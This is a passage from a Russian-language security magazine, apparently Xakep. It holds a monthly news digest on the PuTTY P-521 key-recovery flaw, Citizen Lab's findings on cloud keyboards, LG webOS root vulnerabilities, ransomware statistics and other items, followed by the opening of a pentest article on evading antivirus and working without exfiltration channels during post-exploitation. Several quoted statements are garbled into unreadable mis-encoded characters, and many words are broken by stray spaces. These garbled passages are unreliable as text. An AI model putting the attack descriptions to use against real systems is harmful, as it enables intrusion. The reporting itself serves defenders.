  по поводу этой проблемы, но не получи ли ответа. С GitHub удалили мал варь,
  связанную  с  репозитори ями  Microsoft. Однако  вре доносы,  связанные
  с httprouter и Aimmy, по-прежнему дос тупны, а их URL-адреса работа ют.
     Хуже того, выяснилось, что ана логичная проблема затрагива ет и GitLab.
  В этом случае сге нерированные ссылки на файлы тоже оста ются активными,
  даже если ком ментарий не был опубликован или был сразу уда лен.





  ПАВЕЛ ДУРОВ О РОСТЕ TELEGRAM
  В апреле 2024 года Павел Дуров дал первое за мно го лет ви деоинтервью американ скому жур-
   налисту Такеру Карлсону. В этой беседе Дуров говорил о мно гом, вклю чая VK, отъезд из Рос-
   сии, слиш ком присталь ное внимание со стороны западных спецслужб, бюрок ратию в раз ных
   странах, знакомс тво с Марком Цукербергом, идею создания Telegram.
       Также Дуров заявил, что Telegram никогда не тратил ся на маркетинг и совсем скоро дос-
   тигнет отметки в миллиард активных поль зователей.

              «Telegram распростра няет ся как лесной пожар: 2,5 миллиона пользовате лей →         ежедневных регис траций. Мы представляем своего рода угро зу. <…> Наши
          конкуренты тра тят десят ки мил лиар дов на маркетинг и извес тны тем, что поль-
          зуют ся услугами PR-фирм для про ведения подоб ных кам паний.
           (Мы пот ратили на маркетинг) ноль дол ларов. Мы никогда ничего не тратили
          на привлечение поль зователей в маркетин говых целях. Мы никогда не прод-
          вигали Telegram на дру гих социаль ных платформах. В этом боль шое отли чие
          от про чих приложений. Вы могли наблюдать, как они рек ламируются здесь
         и там. Telegram действует ина че. Весь наш рост про исходит орга нично. Мы
         прив лекли поч ти 900 мил лионов поль зователей, ничего не тратя на рекламу. <…
       > Вероятно, через год их количес тво превысит мил лиард.
         Лю дям нра вится наш продукт. Мы довольно давно поняли, что люди умны.
        Людям нравит ся использовать хорошие вещи, и они не любят использовать
          некачественные. Поэтому всякий раз, когда человек начинает поль зоваться
           Telegram, проводит там некоторое время и начинает откры вать для себя все
         функции, скорость, безопас ность, конфиденциальность (все, что у нас есть), он
         не хочет возвра щаться и начинает приглашать своих друзей, рекомендовать:
         „Вам действи тельно сто ит поп робовать это приложение, потому что оно нам-
          ного луч ше всего остального“. А еще люди понимают, что, какими бы приложе-
         ниями для обме на сообщени ями они ни поль зовались сейчас, те отстают при-
         мерно на пять-шесть лет. Они копируют то, что мы делали шесть лет назад. И в
          отношении функций это не очень качес твенная копия. Люди любят качество, вот
         почему они мигрируют в Telegram», — рассказал Дуров.





 СЕРЬЕЗНАЯ
 УЯЗВИМОСТЬ PUTTY
  Разработ чики PuTTY вы пустили обновление, исправ ляющее криптогра фичес-
  кую уязвимость CVE-2024-31497, которая затрагивает версии с 0.68 по 0.80.
  Сообщается, что проб лему можно использовать для полного восстановления
  при ват ных клю чей NIST P-521 (ecdsa-sha2-nistp521).
     Уяз вимость была обнаружена специалистами из Рурского университета
   в Бохуме и связана с тем, как PuTTY генерирует ECDSA nonce (временные
  уни кальные крип тографические числа) для эллиптической кри вой NIST P-521,
  используемой для SSH-аутентифика ции. Ошиб ка воз никает в силу того, что
  PuTTY использует детерминированный способ генерации таких чисел, чтобы
  ком пенси ровать отсутс твие надежного крип тогра фического генератора слу-
  чайных чисел в опре деленных версиях Windows.
    Иссле дователи объясняют, что циф ровая под пись соз дает ся с помощью
  при ват ного ключа поль зователя и проверяется с помощью соответс твующего
  пуб личного ключа на сервере, обеспечивая иден тификацию и безопас ность
  ком муникаций.
     Злоумышленникам пот ребуется изу чить порядка 58 под писей для вычис-
  ления при ват ного клю ча жертвы. Ата кующие могут либо получить под писи,
  собирая их с SSH-сер вера, который они контро лиру ют или взломали, либо
  извлечь их из под писанных коммитов Git.
    При этом сбор подписей из публичных коммитов может оказаться гораздо
  более эффекти вен и опа сен. Так, обыч но для под писания коммитов локально
  используется Pageant, SSH-агент PuTTY, а затем осу ществля ется пересылка
  на хост разработчика. Git нас тра ивается на исполь зование OpenSSH для под-
  писания Git-ком митов с помощью SSH-ключа, предоставленного Pageant. То
   есть под пись генери руется Pageant, что делает ее пригодной для восстанов-
  ления при ват ного клю ча. А Git-подписи могут быть обще доступны, например
  если ком мит присутствует в публичном репозитории на GitHub.


        «Âñå êëèåíòñêèå êëþ ÷è NIST P-521, èñïîëüçóåìûå ñ PuTTY, äîëæíû
         ñ÷èòàòüñÿ ñêîì ïðîìåòèðîâàííûìè, ó÷èòûâàÿ, ÷òî àòà êà ìîæåò áûòü «
         îñó ùåñòâëå íà äàæå ïîñ ëå òîãî, êàê îñíîâíàÿ ïðîáëåìà áóäåò èñïðàâ-
         ëåíà â èñõîäíîì êîäå (ïðè óñëîâèè, ÷òî ïåðåä èñïðàâ ëåíèåì çëî-
       óìûø ëåííèêó áûëè äîñ òóïíû îêîëî 60 ïîä ïèñåé), — ïðå äóï ðåäèëè
         èññëå äîâà òåëè. — Çëîóìûø ëåííèê, îáëà äàþùèé íåñ êîëüêèìè äåñÿò-
        êàìè ïîä ïèñåé è ïóáëè÷íûì êëþ ÷îì, èìå åò äîñ òàòî÷ íî èíôîðìà öèè,
         ÷òîáû âîñ ñòà íîâèòü ïðèâàòíûé êëþ÷, à çàòåì ïîääåëàòü ïîä ïèñè, áóä-
         òî îíè èñõîäÿò îò âàñ. Ýòî ïîç âîëèò åìó, íàï ðèìåð, âîéòè íà ëþáûå
        ñåð âåðû, äëÿ êîòîðûõ âû èñïîëüçóåòå ýòîò êëþ÷. ×òîáû ïîëó÷èòü ïîä-
         ïèñè,  çëîóìûø ëåííèêó  äîñ òàòî÷ íî  íåíàäîëãî  ñêîì ïðîìåòèðîâàòü
        ëþáîé ñåð âåð, äëÿ àóòåíòèôèêà öèè íà êîòîðîì âû èñïîëüçóåòå êëþ÷,
        èëè íà êîðîòêîå âðå ìÿ ïîëó÷èòü äîñ òóï ê êîïèè Pageant, õðà íÿùåé
         êëþ÷».                 »
  Разработ чики устранили уязвимость в PuTTY 0.81, где перешли на RFC
  6979 для всех ключей DSA и ECDSA. Подчеркивает ся, что все приват ные клю-
  чи P-521, сгенерированные с помощью уязвимой версии PuTTY, следует счи-
   тать небезопасными и их нужно как мож но ско рее заменить новыми.
     Известно, что уязвимую версию PuTTY используют следующие продукты:
   • FileZilla 3.24.1–3.66.5 (исправлено в версии 3.67.0);
   • WinSCP 5.9.5–6.3.2 (исправлено в 6.3.3);
   • TortoiseGit 2.4.0.2–2.15.0 (исправлено в 2.15.0.1);
   • TortoiseSVN  1.10.0–1.14.6  (исправление  воз можно  при  настрой ке
      TortoiseSVN на использование Plink в последней версии PuTTY 0.81).

  Ве роятно, соф та, уязвимого перед CVE-2024-31497, может оказаться даже
  боль ше (все зависит от того, какая вер сия PuTTY исполь зуется), поэтому
  поль зовате лям рекомендуется про верить свои инс трументы и при необ-
  ходимос ти принять превен тивные меры.


  БЛОКИРОВКА 150 VPN-СЕРВИСОВ

   На чальник управления контроля и надзора в сфере электронных коммуникаций Рос комнадзора
   Евгений Зай цев расска зал, что в нас тоящее время Рос комнадзор бло кирует око ло 150
   популярных VPN-сервисов. Также были заб локированы порядка 700 материалов, которые «рас-
   простра няли пропаганду использования VPN для обхода блокиро вок».


   За неуда ление информации о популяризации способов и методов обхо да блокировок закон
   предус матривает  административную  ответс твен ность  в  виде  штрафа  от  800  000
   до 4 000 000 рублей.





                                        Продолжение статьи →
← Начало статьи





 ПРОБЛЕМЫ
 ОБЛАЧНЫХ
 КЛАВИАТУР
  Эксперты Citizen Lab обнаружи ли мно гочисленные уяз вимости в облачных
  при ложе ниях пиньинь-клавиатур. В ком пании предупредили, что эти проб-
  лемы могут использоваться для перехвата нажатий клавиш и в общей слож-
  ности угрожают примерно миллиарду поль зователей.
    Иссле дователи рассказывают, что наш ли уязвимос ти в восьми из девяти
   изучен ных при ложе ний таких производителей, как Baidu, Honor, iFlytek, OPPO,
  Samsung, Tencent, Vivo и Xiaomi. Единственным производителем, в чьем при-
  ложении не было най дено проблем, ока залась компания Huawei.
     Найденные баги могут применяться для «пол ного раскрытия нажатых
  поль зовате лем клавиш при передаче». Суммарно этот класс уязвимос тей
   затрагивает около миллиарда пользователей по всему миру. Ведь 95% рынка
   кла виатур, созданных для того, чтобы пользователи могли быстро и легко
  вводить иероглифы, занимают уяз вимые IME (Input Method Editor) ком паний
  Sogou, Baidu и iFlytek.
     Успешная эксплу атация багов в таких приложениях позволяет рас шифро-
  вывать нажатия клавиш без передачи допол нитель ного сетевого трафика.
  Дело в том, что IME-клавиатуры часто име ют облачные функции, которые рас-
  ширяют их функци ональность. Это связано со слож ностью прогнозирования
   того, какие символы пользователь вве дет сле дующими, осо бен но в логог-
  рафичес ких языках, таких как китай ский.
    Иссле дование Citizen Lab основывается на результатах пре дыдущих изыс-
  каний, в ходе которых в августе прошлого года были выявлены серьезные
  крип тографические недостатки в приложении Sogou Input Method компании
   Tencent. Это приложе ние насчитывает более 455 миллионов активных поль-
  зователей в Windows, Android и iOS.
     Те перь в Citizen Lab рассказывают, что популярные пиньинь-кла виатуры
  под верже ны сле дующим багам:
   • Tencent QQ Pinyin уязвимо перед ата кой CBC padding oracle, которая
     может при вести к восста новлению набранного текста;
   • Baidu IME поз воля ет третьим лицам рас шифровывать сетевые ком-
     муникации и извле кать наб ранный в Windows текст бла годаря ошиб ке
     в протоко ле шиф рования BAIDUv3.1;
   • iFlytek IME для Android позволя ет третьим лицам вос станав ливать текст
     за счет недостаточно зашифрованных сетевых коммуникаций;
   • Samsung Keyboard на Android переда ет данные о нажатии клавиш
     по обыч ному, незашифрован ному протоко лу HTTP;
   • на  устройствах  Xiaomi  пре дустановлены  клавиату ры  Baidu,  iFlytek
     и Sogou, и поэтому они подвержены уже перечис ленным выше проб-
     лемам;
   • на устройства OPPO пре дустановлены клавиатурные приложе ния Baidu
     и Sogou, и они тоже обла дают теми же недостатка ми;
   • Vivo пос тавляется с пре дустановленным и уязвимым Sogou IME;
   • а на устройства Honor предварительно уста нав ливается уязвимый Baidu
      IME.

  В Citizen Lab пред полага ют, что китайские разработчики при ложе ний менее
  склонны к использованию запад ных криптогра фичес ких стандартов из-за
  опасений, что те могут содержать бэк доры. Это побуждает их разрабаты вать
  собствен ные шифры и допус кать ошиб ки.
     После того как исследователи уведомили разработчиков кла виатур о най-
  денных проблемах, боль шинство из них устранили баги. Только спе циалис ты
  Honor и Tencent еще работа ют над пат чами.


         «Ó÷èòûâàÿ ìàñ øòàá ýòèõ óÿç âèìîñ òåé, äåëèêàòíîñòü òîãî, ÷òî ïîëü-
         çîâàòå ëè îáû÷ íî íàáèðà þò íà ñâîèõ óñòðîéñòâàõ, à òàê æå ëåãêîñòü, «
         ñ êîòîðîé ýòè óÿç âèìîñ òè ìîãëè áûòü îáíà ðóæå íû, è òîò ôàêò, ÷òî
         àëüÿíñ   Five  Eyes  ðàíåå  èñïîëüçîâàë  àíà ëîãè÷ íûå  óÿç âèìîñ òè
         äëÿ ñëåæêè â êèòàéñêèõ ïðèëîæå íèÿõ, âïîëíå âåðîÿòíî, ÷òî íàæàòèÿ
         êëà âèø ïîëüçîâàòå ëåé ìîãëè ïîäâåðãàòüñÿ ìàñ ñîâîìó ìîíèòîðèí-
           ãó», — çàê ëþ÷à þò ñïå öèàëèñ òû.                 »

 76% ХАКЕРОВ РУКОВОДСТВУЮТСЯ ФИНАНСОВОЙ
 МОТИВАЦИЕЙ
   Эк сперты ком пании BI.ZONE пред ста вили иссле дование рос сийско го ландшафта киберугроз
   и хакгруппировок — Threat Zone 2024. Отчет основан на анализе данных, собранных экспертами
   из подразделений реагирования на инциден ты, мониторинга и киберразведки.

  В 2023 году ком пания отслеживала более 50 группировок, атаковавших рос сий ские компании.

  15% атак приш лось на сферу ритейла, по 12% — на промышленные и топливно-энергетические
   компании, а также финансовые и страховые орга низации. Еще 10% было нацелено на тран-
   спортную отрасль.





  76% атак оказались обус ловлены финансовой мотивацией. Преступники распространяли
   вымогатели, требова ли выкуп за ском прометированную кон фиден циальную информацию,
   а также находи ли спо собы получить пря мой доступ к финан совым активам жертв.

  15% атак были свя заны со шпионажем. Специалис ты выявили 5 ранее неизвестных груп-
   пировок. Кро ме того, шпионажем занялись несколь ко групп, у которых раньше была финан-
   совая мотива ция.

   На долю хактивизма пришлось толь ко 9% атак. Количес тво атак, совершаемых по иде оло-
   гичес ким мотивам, пос тепенно уменьшает ся: все больше хактивис тов перехо дят к финан сово
   мотиви рованным преступлениям либо совмещают оба вида атак.





   На иболее популярной мал варью в 2023 году ста ло шпионское ПО Agent Tesla, которое
   задей ствовали в 22% атак. Также среди зло умыш ленни ков резко выросла популярность
   легитим ных инструментов Adminer и Gsocket.





 ПЕСОЧНИЦА ДЛЯ V8
  Стремясь повысить устойчивость Chrome перед проб лемами памяти, Google
  добавляет в свой браузер песочницу V8, и ИБ-исследователи смогут искать
   в ней уязвимости.
    В последние годы Chrome не раз страдал от проблем с безопас ностью
   памяти, боль шинство из которых ока зыва лись свя заны с JavaScript-движком
   V8. Причем в случае V8 обыч ные средства защиты (исполь зование аппарат-
  ных механизмов безопасности или переход на более безопас ный для памяти
   язык, нап ример Rust), к сожалению, не помога ют.


         «Ïðàê òè÷åñ êè  âñå   óÿç âèìîñ òè,  íàéäåííûå  è  ýêñ ïëó àòèðóåìûå
         â V8 íà ñåãîä íÿ, èìå þò îäíó îáùóþ ÷åð òó: ïîâ ðåæäå íèå ïàìÿòè îáÿ- «
         çàòåëüíî ïðîèñõîäèò âíóòðè õèïà V8, ïîñ êîëüêó êîì ïèëÿòîð è runtime
         ïî÷ òè   âñåãäà   îïå ðèðó þò   èñêëþ ÷èòåëüíî   ýêçåì ïëÿðàìè   V8
         HeapObject», — ðàñ ñêà çûâà þò â Google.                 »
  Но вая песоч ница для V8 изолирует память хипа, что бы предотвратить пов-
  реждение других час тей памяти процес са. Поскольку подходяще го аппарат-
  ного обеспечения для этих целей не существует, Google решила реализовать
  песоч ницу программно.

         «Îñíîâíàÿ èäåÿ ïðîãðàì ìíîé ïåñî÷ íèöû çàê ëþ÷à åòñÿ â çàìåíå âñåõ
         òèïîâ äàííûõ, êîòîðûå ìîãóò îáðà ùàòüñÿ ê ïàìÿòè âíå ïåñî÷ íèöû, «
         ñîâ ìåñòèìûìè ñ ïåñî÷ íèöåé àëüòåð íàòèâà ìè. Â ÷àñ òíîñ òè, âñå óêà-
         çàòå ëè (íà îáúåêòû êàê â õèïå V8, òàê è â äðó ãèõ ìåñ òàõ) è 64-áèòíûå
         ðàç ìåðû äîëæíû áûòü óäà ëåíû, ïîñ êîëüêó çëîóìûø ëåííèê ìîæåò ïîâ-
         ðåäèòü èõ, ÷òîáû âïîñ ëåäñ òâèè ïîëó÷èòü äîñ òóï ê äðó ãîé ïàìÿòè», —
         ãîâîðÿò ðàç ðàáîò÷èêè.                 »
  По словам экспер тов, в реальных сценариях атак злоумышленни ки не смогут
  выйти из песочницы и добрать ся до других частей памяти процес са, посколь-
   ку сначала им пот ребу ется обой ти песочницу V8, что заметно усложнит
   задачу.
     Изначально предложенная еще в 2021 году, песоч ница для V8 теперь счи-
   тается жиз неспособной защитной фун кцией, и Google уже внедрила ее
   в Chrome 123 в целях тестирования. Также компания добавила песочницу
   в bug bounty программу Chrome Vulnerability Rewards Program, чтобы раз-
  работ чики систем безопасности и исследователи мог ли выявить в ней недос-
   татки и уязвимости.
    По словам Google, все обна руженные на сегод няшний день проб лемы —
   это три виальные ошиб ки поврежде ния памяти, которые нетрудно предот вра-
   тить или смяг чить, в отличие от более серьезных багов, обыч но обнаружи-
  ваемых в V8.
     Также отмечается, что на песочницу V8 при ходит ся лишь 1% (или меньше)
   пот ребле ния ресур сов при типичных рабочих наг рузках, а значит, она может
  быть вклю чена по умол чанию на совместимых плат формах. В течение пос-
  ледних недель песочница V8 была активна по умолчанию в 64-бит ных версиях
  Chrome для Android, ChromeOS, Linux, macOS и Windows, в основном для про-
  верки стабильности и сбора статистики по про изво дитель ности.


 ОБЪЕМ УТЕЧЕК ВЫРОС В 5 РАЗ

   По информации сервиса разведки утечек данных и монито рин га даркне та DLBI (Data Leakage &
   Breach Intelligence), в пер вом квартале 2024 года количес тво уте чек незначительно умень-
   шилось (57 про тив 60), одна ко объем их вырос в 5 раз.

  В сеть попали 121 миллион телефон ных номеров и 38 миллионов email-адресов против
    11 миллионов номеров телефонов и 23 миллионов  email-адресов  в первом  квар-
   тале 2023 года.


   Также изменились лидеры по объему утечек клиент ских данных. Если в прошлом году поч ти
  50% потерь пришлось на медицинские орга низа ции и апте ки, то в этом году более 70% дан-
   ных утек ло из финансовых организаций.





 ROOT ТЕЛЕВИЗОРОВ
 LG
  Уязвимости в умных телеви зорах LG, работа ющих под управле нием webOS,
  позволя ют зло умышленникам обойти авторизацию и получить root-доступ
   к устройству, предуп редили специалисты Bitdefender. По данным Shodan,
   в сети можно обнаружить 91 тысячу телевизоров, уязвимых для таких атак.
    Сразу четыре проблемы, которые зат рагивают webOS версий с 4 по 7,
  обнаружил эксперт ком пании Bitdefender Labs Александру Лазар (Alexandru
   Lazăr). При этом в опуб ликованном компани ей отчете подчеркивается, что
   уязвимый сер вис предназначен для работы исключительно в локаль ной сети,
  однако в интерне те, как было отмечено выше, доступны более 91 тысячи
  устройств.
    Проблемы позволяют получить несан кциони рованный доступ к затронутым
  моделям телевизоров и кон троль над ними, вклю чая обход авто риза ции,
  повыше ние привиле гий и внедрение команд.
    Потенциальные ата ки основаны на возможности соз дания произвольных
   учетных записей с помощью сервиса, работающе го на портах 3000/3001.
  В обычных обстоятель ствах он позволяет подклю чить смартфон к телевизору
  при помощи ввода PIN-кода. Однако из-за уязвимос ти этап с PIN-кодом мож-
  но про пустить.





   • CVE-2023-6317  (7,2 балла по шка ле CVSS) — позволяет обойти
     механизм  авторизации  телевизора  путем  модификации  нас тройки
     переменных и добавить нового пользователя без авто риза ции;
   • CVE-2023-6318 (9,1 балла по шкале CVSS) — уяз вимость повышения
     привиле гий, поз воляющая получить root-пра ва после получе ния пер-
     воначального доступа к устройству через CVE-2023-6317;
   • CVE-2023-6319 (9,1 балла по шка ле CVSS) — проблема инъекции
     команд, свя занная с библиотекой, отве чающей за отображение текстов
     песен, которая позволяет выполнять про извольные команды;
   • CVE-2023-6320 (9,1 балла по шка ле CVSS) — аутентифицированная
     инъекция   команд   через   исполь зование   конечной   точки   API
      com.webos.service.connectionmanager/tv/setVlanStaticAddress,  позволяет
     выполнять команды от имени поль зователя dbus, который име ет права,
     схо жие с root.

  Пе речис ленные проблемы затрагивают webOS 4.9.7–5.30.40 на телевизорах
  LG 43UM7000PLA, webOS 04.50.51–5.5.0 на телевизорах OLED55CXPUA,
  webOS 0.36.50–6.3.3-442 на телевизорах OLED48C1PUB, а также webOS
   03.33.85–7.3.1-43 на телевизорах OLED55A23LA.
      Bitdefender  уве доми ла LG  о  найден ных  уяз вимостях еще  1  нояб-
  ря 2023 года, но производитель выпустил соответству ющие обновления
  безопасности толь ко 22 мар та 2024 года.
     Хо тя телеви зоры LG пре дупрежда ют пользователей о выходе важных
  обновле ний для webOS, исследова тели рекомендуют проверить наличие этих
  обновле ний вруч ную и как можно скорее.
    Дело в том, что, скомпро метировав телевизор, злоумышленни ки, к при-
   меру, могут добраться до других, более важных устройств, под ключенных
   к той же сети, или получить доступ к учет ным записям жертвы в установленных
  на устройстве приложениях (нап ример, стри минговых сервисов).


 ВЫМОГАТЕЛИ ЗАРАБОТАЛИ ÌÈËËÈÀÐÄ

   Аналити ки Positive Technologies сообщили, что 2023 год ознаменовался рекордными выкупами
   операторам вымогатель ско го ПО, а также замет ным увеличением мас штабов и сложности атак
  шифровальщиков. Так, вып латы вымогателям в прошлом году составили более 1 миллиарда
  долларов, что является самым высоким показателем за всю историю.

   Боль ше всего от атак вымогателей пос тра дали медицинские организации (18% всех инци-
   дентов приш лось на медицинскую отрасль). Атаки вымогателей приводили к закрытию некото-
   рых учреждений, перенаправлению карет скорой помощи в другие больницы и задержкам
   в предос тавлении медицинских услуг.





   Также в чет верку наиболее ата куемых шифроваль щиками отраслей вошли орга низации из сфе-
   ры науки и обра зования  (14%), государственные учреждения  (12%) и промыш-
  ленные организации (12%).

   Боль шинс тво шифровальщиков распространялось с помощью электрон ной почты  (62%)
   и путем компромета ции компь ютеров и серверов (35%).





                        Пос ледс твия атак с использовани ем шифровальщиков





 YOUTUBE VS
 БЛОКИРОВЩИКИ
  Компания Google, сто ящая за раз работкой YouTube, объявила, что сто ронние
  при ложе ния, блокирующие рекламу при прос мотре видео на  YouTube,
  нарушают условия предоставления услуг (Terms of Service). Google предуп-
  реждает, что ско ро начнет при нимать меры против таких при ложе ний.
     Как известно, Google предос тавляет мно жес тво API, позволяющих раз-
  работ чикам интегри ровать YouTube в свои приложе ния, проигрывать видео
  или получать данные о видео, размещенных на плат форме. Некоторые раз-
  работ чики поль зуются этим, что бы создавать при ложе ния для Android и iOS,
  позволя ющие смотреть YouTube без рекламы. И многие из этих при ложе ний
  нас читывают миллионы пользователей.
     Те перь в Google сооб щили, что все при ложе ния, использующие API
  YouTube и блокиру ющие рекламу, вскоре могут быть отключены от API
  для раз работ чиков.
    В ком пании предупредили, что пользователи таких приложений теперь
   могут сталкиваться с дли тельной буфери зацией контента или ошибкой «Кон-
   тент недоступен в этом при ложении» при попытке загрузки видео. Разработ-
   чики подчеркнули, что эти меры приз ваны защитить создателей контента,
  пос коль ку отключение рекламы напрямую вли яет на их доходы.

       «Ìû õîòèì ïîä÷åð êíóòü, ÷òî íàøè Terms of Service íå ïîç âîëÿþò ñòî-
        ðîííèì ïðèëîæå íèÿì îòêëþ ÷àòü ðåê ëàìó, ïîñ êîëüêó ýòî ìåøà åò ñîç- «
        äàòåëÿì  ïîëó÷àòü  âîç íàãðàæäåíèå  çà  ïðîñ ìîòðû,  à  ðåê ëàìà
         íà YouTube ïîìîãà åò ïîä äåðæèâàòü ñîç äàòåëåé è ïîç âîëÿåò ìèëëèàð-
        äàì ëþäåé ïî âñå ìó ìèðó ïîëüçîâàòüñÿ ïîòîêîâûì ñåð âèñîì», — ãëà-
         ñèò îôèöèàëüíîå çàÿâ ëåíèå YouTube.                 »
  Тем, кто хочет наслаждать ся YouTube без рекламы, компания предлагает под-
   писку Premium, стоимость которой варь ируется от 13,99 до 18,99 доллара
  США в зависимос ти от платформы пользовате ля.
    Напомним, что в прошлом году Google начала активно препятство вать ра-
  боте блокировщиков рек ламы на YouTube. Например, компания добави ла
  пятисе кун дную задер жку при первоначальной загрузке сай та для пользовате-
  лей с расширениями-блокировщиками, а также в качестве эксперимента
  огра ничи ла таких пользователей всего тремя прос мотрами видео.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
   На фаль шивых собеседова ниях разработчиков вынуждают уста новить бэкдор


   «Лаборатория Кас перского» обна ружи ла криптовалютную пирамиду в Telegram


   Те леви зор Hisense случайно вывел из строя Windows-компь ютер владель ца


   Мал варь атакует тех, кто ищет дет ское пор но


   MITRE взломали «правитель ственные хакеры»


   Discord банит ботов сервиса Spy Pet, торгующего данными


   GPT-4 может экс плу атировать уязвимос ти, изучив бюллетени безопасности


   Бэк дор-акка унт при сутс тву ет в 90 000 NAS D-Link


  В протоколе HTTP/2 наш ли ряд проб лем под общим названием Continuation Flood


   Разработ чики Notepad++ попросили помощи в борьбе с сайтом-подражателем
COVERSTORY





При тес тировании на проник новение в рас-
поряжении ата кующего далеко не всегда
оказыва ется  система  с  привиле гиями
администра тора  или  root-пра вами,  зато
на ней  могут обнаружиться  антивирусы               s0i37                                                                                       Lead cybersecurity
и брандмауэры. Казалось бы, на этом пен-              analyst at USSC                                                                                             @s0i37_channel
тесту капут, ведь раз вить атаку практичес ки              s0i37@ya.ru
невоз можно. Но тут на помощь взломщику
придет магия эмуляции и виртуали зации.
Эти  две  тех нологии  и  вправду  тво рят
чудеса!




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Сегод ня скачать экспло ит, ввести IP-адрес и пробить периметр может любой
школь ник. Благодаря многочисленным сканерам безопасности и разнооб-
разным информацион ным ресурсам порог входа в область поиска и эксплу-
ата ции уязвимос тей стал куда ниже, чем рань ше.
  Но очень часто полученный дос туп — это лишь начало длинного пути. Ког-
да в результате поисков наконец-то обнаружена уязвимость и про бит внеш-
ний периметр, впе реди нас ждет самое веселое — продвижение по внут-
ренней инфраструк туре. Ведь настоящий взлом — процесс многоступен-
чатый.
  Во обще, экосистема внутренних сетей может разительно отличаться
от того, что видно на внешнем периметре, даже у одной и той же компании.
Мне доводи лось наб людать кардинально про тиво положные картины: идеаль-
но при чесанные и обновленные ресурсы, смотрящие в интернет, и полный
бардак во внутренней сети.
  На самом деле внутренние сети, благода ря их закрытости от внешнего
мира, недостижимы для разнооб разных вирусов, сканеров и хакеров, поэто-
му под чиняются иным законам и время там течет гораздо медленнее. Если
на внешних ресур сах мы едва ли найдем силь но устаревший софт, то
во «внутрянке» вполне можно обна ружить множество десятилетних уяз вимос-
тей. Ведь глав ный защитный механизм внутренних ресурсов — это их изо-
ляция от внеш него мира.
  Сразу пос ле получе ния доступа к внутренним ресур сам руки сами тянутся
про верить массу потенциальных уязвимостей из раз ряда low-hanged fruits —
чего-то достаточно прос того, часто встречающе гося и дающе го мак сималь-
ный импакт. А уж если в придачу к скомпрометированному хосту мы получи ли
еще и домен ную учетку — то держись, домен, и с ним вся внутренняя
инфраструк тура!
  Однако если админы и сетеви ки молодцы, то сра зу же после пробития
перимет ра у нас нач нутся проблемы. При мерно в полови не слу чаев прос того
халяв ного реверс-шелла мы не получим. Чуть реже нас могут ждать обломы
с ICMP и даже проблемы с DNS-туннелями. Так или иначе, в большинс тве
слу чаев мы все же можем организовать какой-то мало-мальски пригод ный
канал эксфильтрации хотя бы для переда чи файлов. Но порою про комфор-
тный внутренний пентест при ходится забыть.
  С чего вооб ще начина ется любой пентест, хоть внутренний, хоть внешний?
Конеч но же, с разведки, поиска внутренних узлов, то есть сканиро вания пор-
тов. Думаю, большинство пентестеров постара ется протащить на скомпро-
метированный хост Nmap. Хорошо, допус тим, уда лось его передать и раз-
ведать какие-то потенциальные уязвимости. А что потом? Копиру ем подоб-
ным же образом экс плоиты? А к ним еще в при дачу — рантайм, например?
50-мегабай товый Python, на котором написа на полови на эксплоитов?
   Весь хакерский арсенал создавался с прицелом на удобство исполь-
зования и функци ональность, но мало кто закладывал в него легковес ность
и переносимость. В итоге при перемещении по внут ренней инфраструктуре
мы вынуждены будем большую часть вре мени заниматься копированием
скрип тов и программ, а также выг рузкой результатов. Иными словами, адми-
нистри рованием в весьма экс тремальной фор ме.
  Но это в идеальном случае. Если нам «пос частливилось» пробиться через
Windows-машину, то вполне вероятно, что с нами по соседству будет анти-
вирус, скажем тот же Defender. Эти при ложения будут уда лять добрую
половину хакер ского соф та, при чем не только экзешники, но и даже скрипты
на PowerShell из того же PowerSploit, столь популярного для раз ведки и атаки,
без которого мно гие пен тестеры останут ся как без рук.
  А если безопас ники не дремлют, то каждое исчезновение только что ско-
пированной хакерской тулзы — это еще и алерт в SOC, так что пен тест может
очень быстро закончиться. И наконец, кто нам гаран тировал, что на под кон-
трольной машине будут админские или root-пра ва? Их отсутствие также дос-
тавит мас су проб лем.
  В итоге получается забавная, но час то воз ника ющая ситу ация: вроде бы
мы и скомпрометировали какую-то систему, и пробили периметр, и в резуль-
тате у нас появился сетевой дос туп до каждого внутренне го узла. По ощу-
щени ям — кругом дыры в безопасности, и нам кажет ся, что мы в двух шагах
от кон троллера домена, но почему-то в реальнос ти ничего мы сделать
не можем. И виной тому не защитные меры, а лишь технические нюансы.
Но отсутс твие нормального канала передачи данных, антивирусы, ограничен-
ные права — это не защита, а всего лишь палки в колеса. Нас тоящего хакера
это не остановит.


ÑÕÅÌÀ

При пос тэксплуатации хакер может столкнуть ся со следующими проблемами:
 • ограниченные права;
 • невоз можность запиво тить ся (отсутствие пригодного канала эксфильтра-
   ции);
 • наличие антивируса;
 • спе цифи ка ОС.

По лучается, нам могут встретиться восемь различных условий среды:
 • Windows-система + поль зовательский доступ + канал эксфиль трации
   (post_1);
 • Linux-сис тема + пользовательский дос туп + канал эксфильтрации (post_1);
 • Windows-система + административный дос туп + канал эксфильтрации
   (post_2);
 • Linux-сис тема + root-дос туп + канал эксфильтрации (post_2);
 • Windows-система  +  пользовательский  доступ  +  отсутствие  канала
   эксфильтра ции (post_3);
 • Linux-сис тема + поль зовательский дос туп + отсутс твие канала эксфиль-
   трации (post_3);
 • Windows-система + административный  доступ +  отсутс твие  канала
   эксфильтра ции (post_4);
 • Linux-сис тема + root-дос туп + отсутствие канала эксфильтрации (post_4).

Ис поль зование эмуляции и виртуали зации станет для нас универ саль ным
решени ем всех проблем, с которыми мы только сможем столкнуться при пос-
тэксплуатации. Во-первых, эмуляция и виртуализация абстрагиру ют нас
от ОС на ском промети рованной машине и предлагают единый интерфейс
как для Windows, так и для Linux. Такой подход для Windows отлично устра няет
дефицит ее сетевых возможностей.
   Во-вторых, наличие в атакуемой системе адми нистра тивных или root-прав
не будет для нас необ ходимым усло вием. Реально же права админис тратора
могут потребоваться в двух случаях.
  Первый — это гипервизор, исполь зующий аппа ратные возможности CPU.
В современных вир туаль ных машинах он обес печива ет производительность,
схожую с про изво дитель ностью хостовой ОС, поскольку код гостевой ОС
выполняется реальным про цессором, а не эму лируемым. А безопасная изо-
ляция ресурсов виртуалки от хостовой ОС достигается как раз при виле гиро-
ванными инструкциями виртуализации процессора.
